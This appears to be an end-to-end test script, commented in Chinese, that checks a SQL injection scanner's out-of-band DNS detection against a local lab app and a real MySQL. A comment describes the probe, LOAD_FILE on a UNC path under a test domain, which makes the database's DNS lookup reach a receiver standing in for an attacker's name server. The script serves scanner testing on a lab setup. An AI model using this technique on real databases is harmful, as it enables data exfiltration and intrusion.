// ============================================================================
// e2e/oob-real-lab/dns-engine-verify.mjs —— 引擎级 DNS OOB 全链路真机验证（v2）
// 实战语义的单机等价：真 MySQL 进程解析 UNC 主机名走 Windows 系统解析器（getaddrinfo）；
// NRPT 规则把 .ooblab.test 命名空间路由到 127.0.0.1（等价"攻击者持有权威 NS"）。
// 域名选 .test 保留 TLD：.local 被 Windows 保留给 mDNS（单播 NRPT 不生效，实测踩坑）。
// NRPT 规则需管理员权限添加（普通会话 WIN32 5）；本脚本只校验规则存在，添加走提权会话。
// 全链路：引擎 OobDetector dnsOob 轮（token → MySQL UNC 模板）→ 靶场 HTTP →
//   真 MySQL 8.0.28 执行 LOAD_FILE(\\token.ooblab.test\x) → 系统解析器（NRPT→127.0.0.1:53）→
//   接收端捕获 → waitForToken 命中 → vulnerable=true。
// ============================================================================
import { pathToFileURL } from 'node:url';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import { execFileSync } from 'node:child_process';
import { mkdirSync, writeFileSync } from 'node:fs';

const require = createRequire(new URL('../../server/package.json', import.meta.url));
const { ScanManager } = await import(pathToFileURL(resolve(dirname(fileURLToPath(import.meta.url)), '../../server/src/engine/ScanManager.js')).href);
const { createMysqlOobLabApp } = await import(pathToFileURL(resolve(dirname(fileURLToPath(import.meta.url)), './mysql-lab-app.mjs')).href);
const { oobReceiver } = await import(pathToFileURL(resolve(dirname(fileURLToPath(import.meta.url)), '../../server/src/core/oobReceiver.js')).href);
const express = require('express');

const LAB_PORT = 8172;
const BASE = 'http://127.0.0.1:' + LAB_PORT;
const DNS_DOMAIN = 'ooblab.test';

function ps(cmd) {
  try {
    return execFileSync('powershell', ['-NoProfile', '-Command', cmd], { encoding: 'utf8', timeout: 20000 });
  } catch (e) {
    return '';
  }
}

// 1) 校验 NRPT 规则已存在（添加需提权会话，见 nrpt-setup 流程）
const ruleCheck = ps("Get-DnsClientNrptRule -ErrorAction SilentlyContinue | ForEach-Object { $_.Namespace }");
if (!/ooblab\.test/.test(ruleCheck)) {
  console.log('[fatal] NRPT 规则 .ooblab.test 缺失（需管理员会话预添加：Add-DnsClientNrptRule -Namespace ".ooblab.test" -NameServers "127.0.0.1"）');
  process.exit(2);
}
console.log('[setup] NRPT 规则确认：' + ruleCheck.trim().replace(/\n/g, ' '));

let cleanupDone = false;
function cleanup() {
  if (cleanupDone) return;
  cleanupDone = true;
  console.log('[note] NRPT 规则保留（移除需提权；实验后可手动：Remove-DnsClientNrptRule -Namespace ".ooblab.test"）');
}

// 2) 启动接收端（HTTP 8899 + DNS 53）+ 靶场
await oobReceiver.start({
  enabled: true,
  callbackBase: '127.0.0.1:8899',
  httpPort: 8899,
  timeoutMs: 6000,
  dnsOob: true,
  dnsDomain: DNS_DOMAIN,
  dnsPort: 53,
});

const lab = createMysqlOobLabApp({ waf: true });
const labServer = lab.app.listen(LAB_PORT, '127.0.0.1');
await new Promise((r) => labServer.once('listening', r));

// 3) 引擎扫描：techniques=[oob]、dnsOob 开、dbms=MySQL（真实 MySQL 3307，secure_file_priv 放行）
const sm = new ScanManager();
const scanId = await sm.start({
  url: BASE + '/oob?name=user1',
  config: {
    concurrency: 2, ratePerSec: 0, retry: 0, timeoutMs: 15000, enableExtract: false,
    dbms: 'MySQL',
    techniques: ['oob'],
    oob: { enabled: true, dnsOob: true, dnsDomain: DNS_DOMAIN, dnsPort: 53, httpPort: 8899, callbackBase: '127.0.0.1:8899', timeoutMs: 8000 },
  },
});
const t0 = Date.now();
for (;;) {
  const s = sm.scans.get(scanId);
  if (s && (s.status === 'completed' || s.status === 'error')) break;
  if (Date.now() - t0 > 120000) { sm.stop(scanId).catch(() => {}); break; }
  await new Promise((r) => setTimeout(r, 30));
}
const rep = sm.getReport(scanId) || {};
const v = rep.vulns || [];
console.log('\n[引擎级 DNS OOB] status=' + (sm.scans.get(scanId) || {}).status + ' vulns=' + v.length);
for (const x of v) {
  console.log('  technique:', x.technique, '| dbms:', x.dbms);
  console.log('  evidence:', String(x.evidence || '').slice(0, 240));
}
const dnsHit = v.some((x) => x.technique === 'oob' && /DNS 通道/.test(String(x.evidence || '')));
const anyOob = v.some((x) => x.technique === 'oob');
console.log('\n判定：' + (anyOob ? (dnsHit ? '✅ DNS OOB 全链路命中（引擎→真MySQL→系统解析器→接收端）' : '✅ OOB 检出（HTTP 轮）') : '❌ 未命中'));

// 落盘
const RESULTS_DIR = resolve(dirname(fileURLToPath(import.meta.url)), 'results');
mkdirSync(RESULTS_DIR, { recursive: true });
const genAt = new Date().toISOString();
writeFileSync(resolve(RESULTS_DIR, 'dns-oob-engine-report.json'), JSON.stringify({
  generatedAt: genAt,
  engine: 'MySQL 8.0.28 @3307 (secure_file_priv 放行)',
  mechanism: 'NRPT .ooblab.test → 127.0.0.1:53（等价攻击者权威 NS）',
  vulns: v,
  dnsHit, anyOob,
}, null, 2));

labServer.close();
await lab.close();
try { await oobReceiver.stop?.(); } catch { /* ignore */ }
cleanup();
process.exit(anyOob ? 0 : 1);
